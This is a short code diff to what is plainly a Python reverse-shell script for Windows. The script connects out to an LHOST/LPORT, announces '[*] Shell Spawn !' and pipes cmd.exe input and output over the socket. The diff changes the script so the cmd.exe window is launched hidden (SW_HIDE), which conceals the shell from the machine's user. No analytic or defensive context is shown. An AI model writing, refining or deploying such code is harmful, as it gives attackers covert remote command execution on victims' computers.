@@ -33,7 +33,11 @@ def popen2socket(server_socket, p):
 
 def shell():
     try:
-        p=subprocess.Popen(["c:\\windows\\system32\\cmd.exe"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)
+        SW_HIDE = 0
+        info = subprocess.STARTUPINFO()
+        info.dwFlags = subprocess.STARTF_USESHOWWINDOW
+        info.wShowWindow = SW_HIDE
+        p=subprocess.Popen(["c:\\windows\\system32\\cmd.exe"], shell=False, startupinfo=info, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)
 
         s2p_thread = threading.Thread(target=server2popen, args=[server_socket, p])
         s2p_thread.daemon = True
@@ -55,7 +59,7 @@ def connect(LHOST,LPORT):
     server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     try:
         server_socket.connect((LHOST,LPORT))
-        server_socket.send('[*] Shell Spawn !')
+        server_socket.send('[*] Shell Spawn !\n')
         try:
             shell()
 
